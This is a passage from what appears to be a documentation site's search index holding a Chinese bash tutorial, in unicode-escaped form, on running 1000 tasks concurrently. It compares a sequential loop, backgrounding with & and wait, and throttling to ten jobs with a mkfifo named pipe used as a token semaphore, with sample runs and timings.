\u601d\u8def\uff1a\u4e00\u4e2afor\u5faa\u73af1000\u6b21\uff0c\u987a\u5e8f\u6267\u884c1000\u6b21\u4efb\u52a1\u3002\uff08\u8fd9\u5e94\u8be5\u662f\u5927\u591a\u6570\u4eba\u90fd\u7b2c\u4e00\u65f6\u95f4\u60f3\u5230\u7684\u65b9\u6cd5\u5427\uff09 \u5b9e\u73b0\uff1a #!/bin/bash start_time=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u5f00\u59cb\u65f6\u95f4 for ((i=1;i<=1000;i++)) do sleep 1 #sleep 1\u7528\u6765\u6a21\u4eff\u6267\u884c\u4e00\u6761\u547d\u4ee4\u9700\u8981\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u53ef\u4ee5\u7528\u771f\u5b9e\u547d\u4ee4\u6765\u4ee3\u66ff\uff09 echo 'success'$i; done stop_time=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u7ed3\u675f\u65f6\u95f4 echo \"TIME:`expr $stop_time - $start_time`\" \u8fd0\u884c\u7ed3\u679c\uff1a [root@iZ94yyzmpgvZ ~]# . test.sh success1 success2 success3 success4 success5 success6 success7 ........\u6b64\u5904\u7701\u7565 success999 success1000 TIME:1000 \u4ee3\u7801\u89e3\u6790\u4ee5\u53ca\u95ee\u9898\uff1a \u200b \u4e00\u4e2afor\u5faa\u73af1000\u6b21\u76f8\u5f53\u4e8e\u9700\u8981\u5904\u74061000\u4e2a\u4efb\u52a1\uff0c\u5faa\u73af\u4f53\u7528sleep 1\u4ee3\u8868\u8fd0\u884c\u4e00\u6761\u547d\u4ee4\u9700\u8981\u7684\u65f6\u95f4\uff0c\u7528 'success'$i \u6765\u6807\u793a\u6bcf\u6761\u4efb\u52a1\u3002\u8fd9\u6837\u5199\u7684\u95ee\u9898\u662f\uff0c1000\u6761\u547d\u4ee4\u90fd\u662f\u987a\u5e8f\u6267\u884c\u7684\uff0c\u5b8c\u5168\u662f\u963b\u585e\u65f6\u7684\u8fd0\u884c\uff0c\u5047\u5982\u6bcf\u6761\u547d\u4ee4\u7684\u8fd0\u884c\u65f6\u95f4\u662f1\u79d2\u7684\u8bdd\uff0c\u90a3\u4e481000\u6761\u547d\u4ee4\u7684\u8fd0\u884c\u65f6\u95f4\u662f1000\u79d2\uff0c\u6548\u7387\u76f8\u5f53\u4f4e\uff0c\u800c\u6211\u7684\u8981\u6c42\u662f\u5e76\u53d1\u68c0\u6d4b1000\u53f0web\u7684\u5b58\u6d3b\uff0c\u5982\u679c\u91c7\u7528\u8fd9\u79cd\u987a\u5e8f\u7684\u65b9\u5f0f\uff0c\u90a3\u4e48\u5047\u5982\u6211\u67091000\u53f0web\uff0c\u8fd9\u65f6\u5019\u7b2c900\u53f0\u673a\u5668\u6302\u6389\u4e86\uff0c\u68c0\u6d4b\u5230\u8fd9\u53f0\u673a\u5668\u72b6\u6001\u6240\u9700\u8981\u7684\u65f6\u95f4\u5c31\u662f900\u79d2\uff01 \u6240\u4ee5\uff0c\u95ee\u9898\u7684\u5173\u952e\u96c6\u4e2d\u5728\u4e00\u70b9\uff1a\u5982\u4f55\u5e76\u53d1 \u65b9\u6848\u4e8c \u601d\u8def\uff1a\u4e00\u4e2afor\u5faa\u73af1000\u6b21\uff0c\u5faa\u73af\u4f53\u91cc\u9762\u7684\u6bcf\u4e2a\u4efb\u52a1\u90fd\u653e\u5165\u540e\u53f0\u8fd0\u884c\uff08\u5728\u547d\u4ee4\u540e\u9762\u52a0&\u7b26\u53f7\u4ee3\u8868\u540e\u53f0\u8fd0\u884c\uff09\u3002 \u5b9e\u73b0\uff1a #!/bin/bash start=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u5f00\u59cb\u65f6\u95f4 for ((i=1;i<=1000;i++)) do { sleep 1 #sleep 1\u7528\u6765\u6a21\u4eff\u6267\u884c\u4e00\u6761\u547d\u4ee4\u9700\u8981\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u53ef\u4ee5\u7528\u771f\u5b9e\u547d\u4ee4\u6765\u4ee3\u66ff\uff09 echo 'success'$i; }& #\u7528{}\u628a\u5faa\u73af\u4f53\u62ec\u8d77\u6765\uff0c\u540e\u52a0\u4e00\u4e2a&\u7b26\u53f7\uff0c\u4ee3\u8868\u6bcf\u6b21\u5faa\u73af\u90fd\u628a\u547d\u4ee4\u653e\u5165\u540e\u53f0\u8fd0\u884c,\u4e00\u65e6\u653e\u5165\u540e\u53f0\uff0c\u5c31\u610f\u5473\u7740{}\u91cc\u9762\u7684\u547d\u4ee4\u4ea4\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e00\u4e2a\u7ebf\u7a0b\u5904\u7406\u4e86 #\u5faa\u73af\u4e861000\u6b21\uff0c\u5c31\u67091000\u4e2a&\u628a\u4efb\u52a1\u653e\u5165\u540e\u53f0\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5e76\u53d11000\u4e2a\u7ebf\u7a0b\u6765\u5904\u7406\u8fd9\u4e9b\u4efb\u52a1 done wait #wait\u547d\u4ee4\u7684\u610f\u601d\u662f\uff0c\u7b49\u5f85\uff08wait\u547d\u4ee4\uff09\u4e0a\u9762\u7684\u547d\u4ee4\uff08\u653e\u5165\u540e\u53f0\u7684\uff09\u90fd\u6267\u884c\u5b8c\u6bd5\u4e86\u518d\u5f80\u4e0b\u6267\u884c\u3002 #\u5728\u8fd9\u91cc\u5199wait\u662f\u56e0\u4e3a\uff0c\u4e00\u6761\u547d\u4ee4\u4e00\u65e6\u88ab\u653e\u5165\u540e\u53f0\u540e\uff0c\u8fd9\u6761\u4efb\u52a1\u5c31\u4ea4\u7ed9\u4e86\u64cd\u4f5c\u7cfb\u7edf\uff0cshell\u811a\u672c\u4f1a\u7ee7\u7eed\u5f80\u4e0b\u8fd0\u884c\uff08\u4e5f\u5c31\u662f\u8bf4\uff1ashell\u811a\u672c\u91cc\u9762\u4e00\u65e6\u78b0\u5230&\u7b26\u53f7\u5c31\u53ea\u7ba1\u628a\u5b83\u524d\u9762\u7684\u547d\u4ee4\u653e\u5165\u540e\u53f0\u5c31\u7b97\u5b8c\u6210\u4efb\u52a1\u4e86\uff0c\u5177\u4f53\u6267\u884c\u4ea4\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u53bb\u505a\uff0c\u811a\u672c\u4f1a\u7ee7\u7eed\u5f80\u4e0b\u6267\u884c\uff09\uff0c\u6240\u4ee5\u8981\u5728\u8fd9\u4e2a\u4f4d\u7f6e\u52a0\u4e0await\u547d\u4ee4\uff0c\u7b49\u5f85\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u5b8c\u6240\u6709\u540e\u53f0\u547d\u4ee4 end=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u7ed3\u675f\u65f6\u95f4 echo \"TIME:`expr $end - $start`\" \u8fd0\u884c\u7ed3\u679c: [root@iZ94yyzmpgvZ /]# . test1.sh success1 success2 success4 success5 success6 success9 success8 success12 success10 success11 success14 success18 success21 success20 success24 success15 .... success1000 TIME:2 \u4ee3\u7801\u89e3\u6790\u4ee5\u53ca\u95ee\u9898\uff1a shell\u4e2d\u5b9e\u73b0\u5e76\u53d1\uff0c\u5c31\u662f\u628a\u5faa\u73af\u4f53\u7684\u547d\u4ee4\u7528&\u7b26\u53f7\u653e\u5165\u540e\u53f0\u8fd0\u884c\uff0c1000\u4e2a\u4efb\u52a1\u5c31\u4f1a\u5e76\u53d11000\u4e2a\u7ebf\u7a0b,\u8fd0\u884c\u65f6\u95f42s\uff0c\u6bd4\u8d77\u65b9\u6848\u4e00\u76841000s\uff0c\u5df2\u7ecf\u975e\u5e38\u5feb\u4e86\u3002\u53ef\u4ee5\u770b\u5230\u8f93\u51fa\u7ed3\u679csuccess4 ...success3\u5b8c\u5168\u90fd\u662f\u65e0\u5e8f\u7684\uff0c\u56e0\u4e3a\u5927\u5bb6\u90fd\u662f\u540e\u53f0\u8fd0\u884c\u7684\uff0c\u8fd9\u65f6\u5019\u5c31\u662fcpu\u968f\u673a\u8fd0\u884c\u4e86\uff0c\u6240\u4ee5\u5e76\u6ca1\u6709\u4ec0\u4e48\u987a\u5e8f\u3002\u8fd9\u6837\u5199\u786e\u5b9e\u53ef\u4ee5\u5b9e\u73b0\u5e76\u53d1\uff0c\u7136\u540e\uff0c\u5927\u5bb6\u53ef\u4ee5\u60f3\u8c61\u4e00\u4e0b\uff0c1000\u4e2a\u4efb\u52a1\u5c31\u8981\u5e76\u53d11000\u4e2a\u7ebf\u7a0b\uff0c\u8fd9\u6837\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u9020\u6210\u7684\u538b\u529b\u975e\u5e38\u5927\uff0c\u5b83\u4f1a\u968f\u7740\u5e76\u53d1\u4efb\u52a1\u6570\u7684\u589e\u591a\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5904\u7406\u901f\u5ea6\u4f1a\u53d8\u6162\u751a\u81f3\u51fa\u73b0\u5176\u4ed6\u4e0d\u7a33\u5b9a\u56e0\u7d20\uff0c\u5c31\u597d\u6bd4\u4f60\u5728\u5bf9nginx\u8c03\u4f18\u540e\uff0c\u4f60\u8ba4\u4e3a\u4f60\u7684nginx\u7406\u8bba\u4e0a\u6700\u5927\u53ef\u4ee5\u652f\u63011w\u5e76\u53d1\u4e86\uff0c\u5b9e\u9645\u4e0a\u5462\uff0c\u4f60\u7684\u7cfb\u7edf\u4f1a\u968f\u7740\u9ad8\u5e76\u53d1\u538b\u529b\u4f1a\u4e0d\u65ad\u6500\u5347\uff0c\u5904\u7406\u901f\u5ea6\u4f1a\u8d8a\u6765\u8d8a\u6162\u3002 \u65b9\u6848\u4e09 \u601d\u8def\uff1a\u57fa\u4e8e\u65b9\u6848\u4e8c\uff0c\u4f7f\u7528linux\u7ba1\u9053\u6587\u4ef6\u7279\u6027\u5236\u4f5c\u961f\u5217\uff0c\u63a7\u5236\u7ebf\u7a0b\u6570\u76ee \u77e5\u8bc6\u50a8\u5907\uff1a \u4e00.\u7ba1\u9053\u6587\u4ef6 \u65e0\u540d\u7ba1\u9053\uff08ps aux | grep nginx\uff09 \u6709\u540d\u7ba1\u9053\uff08mkfifo /tmp/fd1\uff09 \u6709\u540d\u7ba1\u9053\u7279\u6027\uff1a 1.cat /tmp/fd1 (\u5982\u679c\u7ba1\u9053\u5185\u5bb9\u4e3a\u7a7a\uff0c\u5219\u963b\u585e) 2.echo \"test\" > /tmp/fd1 (\u5982\u679c\u6ca1\u6709\u8bfb\u7ba1\u9053\u7684\u64cd\u4f5c\uff0c\u5219\u963b\u585e) \u5b9e\u9a8c1\uff1a [root@VM-0-2-centos ~]# mkfifo /tmp/fd1 [root@VM-0-2-centos ~]# ll /tmp/fd1 prw-r--r-- 1 root root 0 Apr 16 13:01 /tmp/fd1 \u7ec8\u7aef1 [root@VM-0-2-centos ~]# cat /tmp/fd1 #\u963b\u585e \u7ec8\u7aef2 [root@VM-0-2-centos ~]# echo 'test1' >/tmp/fd1 [root@VM-0-2-centos ~] \u7ec8\u7aef1 [root@VM-0-2-centos ~]# cat /tmp/fd1 test1 \u6b64\u65f6\u7ec8\u7aef1\u91cc\u9762\u7684\u7ba1\u9053\u4e0d\u518d\u963b\u585e \u5b9e\u9a8c2\uff1a [root@VM-0-2-centos ~]# mkfifo /tmp/fd1 [root@VM-0-2-centos ~]# ll /tmp/fd1 prw-r--r-- 1 root root 0 Apr 16 13:01 /tmp/fd1 \u7ec8\u7aef1 [root@VM-0-2-centos ~]# echo 'test2' >/tmp/fd1 #\u963b\u585e \u7ec8\u7aef2 [root@VM-0-2-centos ~]# cat /tmp/fd1 test2 \u7ec8\u7aef1 [root@VM-0-2-centos ~]# echo 'test2' >/tmp/fd1 [root@VM-0-2-centos ~]# \u6b64\u65f6\u7ec8\u7aef1\u91cc\u9762\u7684\u7ba1\u9053\u4e0d\u518d\u963b\u585e \u603b\u7ed3\uff1a \u5229\u7528\u6709\u540d\u7ba1\u9053\u7684\u4e0a\u8ff0\u7279\u6027\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u961f\u5217\u63a7\u5236\u4e86 \u200b \u4f60\u53ef\u4ee5\u8fd9\u6837\u60f3\uff1a\u4e00\u4e2a\u5973\u58eb\u516c\u5171\u5395\u6240\u603b\u5171\u5c3110\u4e2a\u8e72\u4f4d\uff0c\u8fd9\u4e2a\u8e72\u4f4d\u5c31\u662f\u961f\u5217\u957f\u5ea6\uff0c\u5973\u5395\u6240\u95e8\u53e3\u653e\u774010\u628a\u836f\u5319\uff0c\u8981\u60f3\u4e0a\u5395\u6240\u5fc5\u987b\u62ff\u4e00\u628a\u836f\u5319\uff0c\u4e0a\u5b8c\u5395\u6240\u540e\u5f52\u8fd8\u836f\u5319\uff0c\u4e0b\u4e00\u4e2a\u4eba\u5c31\u53ef\u4ee5\u62ff\u836f\u5319\u8fdb\u53bb\u4e0a\u5395\u6240\u4e86\uff0c\u8fd9\u6837\u540c\u65f6\u6765\u4e861\u5343\u4f4d\u7f8e\u5973\u4e0a\u5395\u6240\uff0c\u90a3\u524d\u5341\u4e2a\u4eba\u62a2\u5230\u836f\u5319\u8fdb\u53bb\u4e0a\u5395\u6240\u4e86\uff0c\u540e\u9762\u7684990\u4eba\u9700\u8981\u7b49\u4e00\u4e2a\u4eba\u51fa\u6765\u5f52\u8fd8\u836f\u5319\u624d\u53ef\u4ee5\u62ff\u5230\u836f\u5319\u8fdb\u53bb\u4e0a\u5395\u6240\uff0c\u8fd9\u683710\u628a\u836f\u5319\u5c31\u5b9e\u73b0\u4e86\u63a7\u52361000\u4eba\u4e0a\u5395\u6240\u7684\u4efb\u52a1\uff08os\u4e2d\u79f0\u4e4b\u4e3a\u4fe1\u53f7\u91cf\uff09 \u4e8c.\u6587\u4ef6\u63cf\u8ff0\u7b26 \u7ba1\u9053\u5177\u6709\u5b58\u4e00\u4e2a\u8bfb\u4e00\u4e2a\uff0c\u8bfb\u5b8c\u4e00\u4e2a\u5c31\u5c11\u4e00\u4e2a\uff0c\u6ca1\u6709\u5219\u963b\u585e\uff0c\u653e\u56de\u7684\u53ef\u4ee5\u91cd\u590d\u53d6\uff0c\u8fd9\u6b63\u662f\u961f\u5217\u7279\u6027\uff0c\u4f46\u662f\u95ee\u9898\u662f\u5f53\u5f80\u7ba1\u9053\u6587\u4ef6\u91cc\u9762\u653e\u5165\u4e00\u6bb5\u5185\u5bb9\uff0c\u6ca1\u4eba\u53d6\u5219\u4f1a\u963b\u585e\uff0c\u8fd9\u6837\u4f60\u6c38\u8fdc\u4e5f\u6ca1\u529e\u6cd5\u5f80\u7ba1\u9053\u91cc\u9762\u540c\u65f6\u653e\u516510\u6bb5\u5185\u5bb9\uff08\u60f3\u5f53\u4e0e10\u628a\u836f\u5319\uff09\uff0c\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\u5c31\u662f\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e86\u3002 mkfifo /tmp/fd1\uff0c\u521b\u5efa\u6709\u540d\u7ba1\u9053\u6587\u4ef6exec 3<>/tmp/fd1\uff0c\u521b\u5efa\u6587\u4ef6\u63cf\u8ff0\u7b263\u5173\u8054\u7ba1\u9053\u6587\u4ef6\uff0c\u8fd9\u65f6\u50193\u8fd9\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u5c31\u62e5\u6709\u4e86\u7ba1\u9053\u7684\u6240\u6709\u7279\u6027\uff0c\u8fd8\u5177\u6709\u4e00\u4e2a\u7ba1\u9053\u4e0d\u5177\u6709\u7684\u7279\u6027\uff1a\u65e0\u9650\u5b58\u4e0d\u963b\u585e\uff0c\u65e0\u9650\u53d6\u4e0d\u963b\u585e\uff0c\u800c\u4e0d\u7528\u5173\u5fc3\u7ba1\u9053\u5185\u662f\u5426\u4e3a\u7a7a\uff0c\u4e5f\u4e0d\u7528\u5173\u5fc3\u662f\u5426\u6709\u5185\u5bb9\u5199\u5165\u5f15\u7528\u6587\u4ef6\u63cf\u8ff0\u7b26\uff1a &3\u53ef\u4ee5\u6267\u884cn\u6b21echo >&3 \u5f80\u7ba1\u9053\u91cc\u653e\u5165n\u628a\u94a5\u5319 \u5b9e\u73b0\uff1a #!/bin/bash start_time=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u5f00\u59cb\u65f6\u95f4 [ -e /tmp/fd1 ] || mkfifo /tmp/fd1 #\u521b\u5efa\u6709\u540d\u7ba1\u9053 exec 3<>/tmp/fd1 #\u521b\u5efa\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u4ee5\u53ef\u8bfb\uff08<\uff09\u53ef\u5199\uff08>\uff09\u7684\u65b9\u5f0f\u5173\u8054\u7ba1\u9053\u6587\u4ef6\uff0c\u8fd9\u65f6\u5019\u6587\u4ef6\u63cf\u8ff0\u7b263\u5c31\u6709\u4e86\u6709\u540d\u7ba1\u9053\u6587\u4ef6\u7684\u6240\u6709\u7279\u6027 rm -rf /tmp/fd1 #\u5173\u8054\u540e\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u62e5\u6709\u7ba1\u9053\u6587\u4ef6\u7684\u6240\u6709\u7279\u6027,\u6240\u4ee5\u8fd9\u65f6\u5019\u7ba1\u9053\u6587\u4ef6\u53ef\u4ee5\u5220\u9664\uff0c\u6211\u4eec\u7559\u4e0b\u6587\u4ef6\u63cf\u8ff0\u7b26\u6765\u7528\u5c31\u53ef\u4ee5\u4e86 for ((i=1;i<=10;i++)) do echo >&3 #&3\u4ee3\u8868\u5f15\u7528\u6587\u4ef6\u63cf\u8ff0\u7b263\uff0c\u8fd9\u6761\u547d\u4ee4\u4ee3\u8868\u5f80\u7ba1\u9053\u91cc\u9762\u653e\u5165\u4e86\u4e00\u4e2a\"\u4ee4\u724c\" done for ((i=1;i<=1000;i++)) do read -u3 #\u4ee3\u8868\u4ece\u7ba1\u9053\u4e2d\u8bfb\u53d6\u4e00\u4e2a\u4ee4\u724c { sleep 1 #sleep 1\u7528\u6765\u6a21\u4eff\u6267\u884c\u4e00\u6761\u547d\u4ee4\u9700\u8981\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u53ef\u4ee5\u7528\u771f\u5b9e\u547d\u4ee4\u6765\u4ee3\u66ff\uff09 echo 'success'$i echo >&3 #\u4ee3\u8868\u6211\u8fd9\u4e00\u6b21\u547d\u4ee4\u6267\u884c\u5230\u6700\u540e\uff0c\u628a\u4ee4\u724c\u653e\u56de\u7ba1\u9053 }& done wait stop_time=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u7ed3\u675f\u65f6\u95f4 echo \"TIME:`expr $stop_time - $start_time`\" exec 3<&- #\u5173\u95ed\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u8bfb exec 3>&- #\u5173\u95ed\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u5199 \u8fd0\u884c\u7ed3\u679c\uff1a [root@iZ94yyzmpgvZ /]# . test2.sh success4 success6 success7 success8 success9 success5 ...... success935 TIME:101 \u4ee3\u7801\u89e3\u6790\u4ee5\u53ca\u95ee\u9898\uff1a \u4e24\u4e2afor\u5faa\u73af\uff0c\u7b2c\u4e00\u4e2afor\u5faa\u73af10\u6b21\uff0c\u76f8\u5f53\u4e8e\u5728\u5973\u58eb\u516c\u5171\u5395\u6240\u95e8\u53e3\u653e\u4e8610\u628a\u94a5\u5319\uff0c\u7b2c\u4e8c\u4e2afor\u5faa\u73af1000\u6b21\uff0c\u76f8\u5f53\u4e8e1000\u4e2a\u4eba\u6765\u4e0a\u5395\u6240\uff0cread -u3\u76f8\u5f53\u4e8e\u53d6\u8d70\u4e00\u628a\u836f\u5319\uff0c{}\u91cc\u9762\u6700\u540e\u4e00\u884c\u4ee3\u7801echo >&3\u76f8\u5f53\u4e8e\u4e0a\u5b8c\u5395\u6240\u9001\u8fd8\u836f\u5319\u3002\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e8610\u628a\u836f\u5319\u63a7\u52361000\u4e2a\u4efb\u52a1\u7684\u8fd0\u884c\uff0c\u8fd0\u884c\u65f6\u95f4\u4e3a101s\uff0c\u80af\u5b9a\u4e0d\u5982\u65b9\u6848\u4e8c\u5feb\uff0c\u4f46\u662f\u6bd4\u65b9\u6848\u4e00\u5df2\u7ecf\u5feb\u5f88\u591a\u4e86\uff0c\u8fd9\u5c31\u662f\u961f\u5217\u63a7\u5236\u540c\u4e00\u65f6\u95f4\u53ea\u6709\u6700\u591a10\u4e2a\u7ebf\u7a0b\u7684\u5e76\u53d1\uff0c\u65e2\u63d0\u9ad8\u4e86\u6548\u7387\uff0c\u53c8\u5b9e\u73b0\u4e86\u5e76\u53d1\u63a7\u5236\u3002 \u6ce8\u610f\uff1a\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26 exec 3<>/tmp/fd1 \u4e0d\u80fd\u6709\u7a7a\u683c\uff0c\u4ee3\u8868\u6587\u4ef6\u63cf\u8ff0\u7b263\u6709\u53ef\u8bfb\uff08<\uff09\u53ef\u5199\uff08>\uff09\u6743\u9650\uff0c\u6ce8\u610f\uff0c\u6253\u5f00\u7684\u65f6\u5019\u53ef\u4ee5\u5199\u5728\u4e00\u8d77\uff0c\u5173\u95ed\u7684\u65f6\u5019\u5fc5\u987b\u5206\u5f00\u5173\uff0cexec 3<&-\u5173\u95ed\u8bfb\uff0cexec 3>&-\u5173\u95ed\u5199","title":"\u63a7\u5236bash\u5b50bash"},{"location":"programming_language/bash_help/mkfifo/#mkfifo","text":"","title":"Mkfifo"},{"location":"programming_language/bash_help/mkfifo/#_1","text":"\u8bed\u6cd5\u683c\u5f0f\uff1a mkfifo [\u53c2\u6570] [\u540d\u79f0] \u5e38\u7528\u53c2\u6570\uff1a -m <\u6a21\u5f0f> \u8bbe\u7f6e\u6743\u9650\u6a21\u5f0f\uff0c\u7c7b\u4f3cchmod -Z \u5c06\u6bcf\u4e2a\u521b\u5efa\u7684\u76ee\u5f55SELinux\u5b89\u5168\u73af\u5883\u8bbe\u7f6e\u4e3aCTX \u53c2\u8003\u5b9e\u4f8b \u521b\u5efaFIFO\u6587\u4ef6 /root/fifo\uff1a [root@linuxcool ~]# mkfifo /root/fifo","title":"\u8bed\u6cd5"},{"location":"programming_language/bash_help/mkfifo/#mkfifoshell","text":"\u9700\u6c42\uff1a\u5e76\u53d1\u68c0\u6d4b1000\u53f0web\u670d\u52a1\u5668\u72b6\u6001\uff08\u6216\u8005\u5e76\u53d1\u4e3a1000\u53f0web\u670d\u52a1\u5668\u5206\u53d1\u6587\u4ef6\u7b49\uff09\u5982\u4f55\u7528shell\u5b9e\u73b0\uff1f","title":"\u7528mkfifo\u63a7\u5236\u5b50shell\u6570\u91cf"},{"location":"programming_language/bash_help/mkfifo/#_2","text":"\u601d\u8def\uff1a\u4e00\u4e2afor\u5faa\u73af1000\u6b21\uff0c\u987a\u5e8f\u6267\u884c1000\u6b21\u4efb\u52a1\u3002\uff08\u8fd9\u5e94\u8be5\u662f\u5927\u591a\u6570\u4eba\u90fd\u7b2c\u4e00\u65f6\u95f4\u60f3\u5230\u7684\u65b9\u6cd5\u5427\uff09 \u5b9e\u73b0\uff1a #!/bin/bash start_time=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u5f00\u59cb\u65f6\u95f4 for ((i=1;i<=1000;i++)) do sleep 1 #sleep 1\u7528\u6765\u6a21\u4eff\u6267\u884c\u4e00\u6761\u547d\u4ee4\u9700\u8981\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u53ef\u4ee5\u7528\u771f\u5b9e\u547d\u4ee4\u6765\u4ee3\u66ff\uff09 echo 'success'$i; done stop_time=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u7ed3\u675f\u65f6\u95f4 echo \"TIME:`expr $stop_time - $start_time`\" \u8fd0\u884c\u7ed3\u679c\uff1a [root@iZ94yyzmpgvZ ~]# . test.sh success1 success2 success3 success4 success5 success6 success7 ........\u6b64\u5904\u7701\u7565 success999 success1000 TIME:1000 \u4ee3\u7801\u89e3\u6790\u4ee5\u53ca\u95ee\u9898\uff1a \u200b \u4e00\u4e2afor\u5faa\u73af1000\u6b21\u76f8\u5f53\u4e8e\u9700\u8981\u5904\u74061000\u4e2a\u4efb\u52a1\uff0c\u5faa\u73af\u4f53\u7528sleep 1\u4ee3\u8868\u8fd0\u884c\u4e00\u6761\u547d\u4ee4\u9700\u8981\u7684\u65f6\u95f4\uff0c\u7528 'success'$i \u6765\u6807\u793a\u6bcf\u6761\u4efb\u52a1\u3002\u8fd9\u6837\u5199\u7684\u95ee\u9898\u662f\uff0c1000\u6761\u547d\u4ee4\u90fd\u662f\u987a\u5e8f\u6267\u884c\u7684\uff0c\u5b8c\u5168\u662f\u963b\u585e\u65f6\u7684\u8fd0\u884c\uff0c\u5047\u5982\u6bcf\u6761\u547d\u4ee4\u7684\u8fd0\u884c\u65f6\u95f4\u662f1\u79d2\u7684\u8bdd\uff0c\u90a3\u4e481000\u6761\u547d\u4ee4\u7684\u8fd0\u884c\u65f6\u95f4\u662f1000\u79d2\uff0c\u6548\u7387\u76f8\u5f53\u4f4e\uff0c\u800c\u6211\u7684\u8981\u6c42\u662f\u5e76\u53d1\u68c0\u6d4b1000\u53f0web\u7684\u5b58\u6d3b\uff0c\u5982\u679c\u91c7\u7528\u8fd9\u79cd\u987a\u5e8f\u7684\u65b9\u5f0f\uff0c\u90a3\u4e48\u5047\u5982\u6211\u67091000\u53f0web\uff0c\u8fd9\u65f6\u5019\u7b2c900\u53f0\u673a\u5668\u6302\u6389\u4e86\uff0c\u68c0\u6d4b\u5230\u8fd9\u53f0\u673a\u5668\u72b6\u6001\u6240\u9700\u8981\u7684\u65f6\u95f4\u5c31\u662f900\u79d2\uff01 \u6240\u4ee5\uff0c\u95ee\u9898\u7684\u5173\u952e\u96c6\u4e2d\u5728\u4e00\u70b9\uff1a\u5982\u4f55\u5e76\u53d1","title":"\u65b9\u6848\u4e00"},{"location":"programming_language/bash_help/mkfifo/#_3","text":"\u601d\u8def\uff1a\u4e00\u4e2afor\u5faa\u73af1000\u6b21\uff0c\u5faa\u73af\u4f53\u91cc\u9762\u7684\u6bcf\u4e2a\u4efb\u52a1\u90fd\u653e\u5165\u540e\u53f0\u8fd0\u884c\uff08\u5728\u547d\u4ee4\u540e\u9762\u52a0&\u7b26\u53f7\u4ee3\u8868\u540e\u53f0\u8fd0\u884c\uff09\u3002 \u5b9e\u73b0\uff1a #!/bin/bash start=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u5f00\u59cb\u65f6\u95f4 for ((i=1;i<=1000;i++)) do { sleep 1 #sleep 1\u7528\u6765\u6a21\u4eff\u6267\u884c\u4e00\u6761\u547d\u4ee4\u9700\u8981\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u53ef\u4ee5\u7528\u771f\u5b9e\u547d\u4ee4\u6765\u4ee3\u66ff\uff09 echo 'success'$i; }& #\u7528{}\u628a\u5faa\u73af\u4f53\u62ec\u8d77\u6765\uff0c\u540e\u52a0\u4e00\u4e2a&\u7b26\u53f7\uff0c\u4ee3\u8868\u6bcf\u6b21\u5faa\u73af\u90fd\u628a\u547d\u4ee4\u653e\u5165\u540e\u53f0\u8fd0\u884c,\u4e00\u65e6\u653e\u5165\u540e\u53f0\uff0c\u5c31\u610f\u5473\u7740{}\u91cc\u9762\u7684\u547d\u4ee4\u4ea4\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e00\u4e2a\u7ebf\u7a0b\u5904\u7406\u4e86 #\u5faa\u73af\u4e861000\u6b21\uff0c\u5c31\u67091000\u4e2a&\u628a\u4efb\u52a1\u653e\u5165\u540e\u53f0\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5e76\u53d11000\u4e2a\u7ebf\u7a0b\u6765\u5904\u7406\u8fd9\u4e9b\u4efb\u52a1 done wait #wait\u547d\u4ee4\u7684\u610f\u601d\u662f\uff0c\u7b49\u5f85\uff08wait\u547d\u4ee4\uff09\u4e0a\u9762\u7684\u547d\u4ee4\uff08\u653e\u5165\u540e\u53f0\u7684\uff09\u90fd\u6267\u884c\u5b8c\u6bd5\u4e86\u518d\u5f80\u4e0b\u6267\u884c\u3002 #\u5728\u8fd9\u91cc\u5199wait\u662f\u56e0\u4e3a\uff0c\u4e00\u6761\u547d\u4ee4\u4e00\u65e6\u88ab\u653e\u5165\u540e\u53f0\u540e\uff0c\u8fd9\u6761\u4efb\u52a1\u5c31\u4ea4\u7ed9\u4e86\u64cd\u4f5c\u7cfb\u7edf\uff0cshell\u811a\u672c\u4f1a\u7ee7\u7eed\u5f80\u4e0b\u8fd0\u884c\uff08\u4e5f\u5c31\u662f\u8bf4\uff1ashell\u811a\u672c\u91cc\u9762\u4e00\u65e6\u78b0\u5230&\u7b26\u53f7\u5c31\u53ea\u7ba1\u628a\u5b83\u524d\u9762\u7684\u547d\u4ee4\u653e\u5165\u540e\u53f0\u5c31\u7b97\u5b8c\u6210\u4efb\u52a1\u4e86\uff0c\u5177\u4f53\u6267\u884c\u4ea4\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u53bb\u505a\uff0c\u811a\u672c\u4f1a\u7ee7\u7eed\u5f80\u4e0b\u6267\u884c\uff09\uff0c\u6240\u4ee5\u8981\u5728\u8fd9\u4e2a\u4f4d\u7f6e\u52a0\u4e0await\u547d\u4ee4\uff0c\u7b49\u5f85\u64cd\u4f5c\u7cfb\u7edf\u6267\u884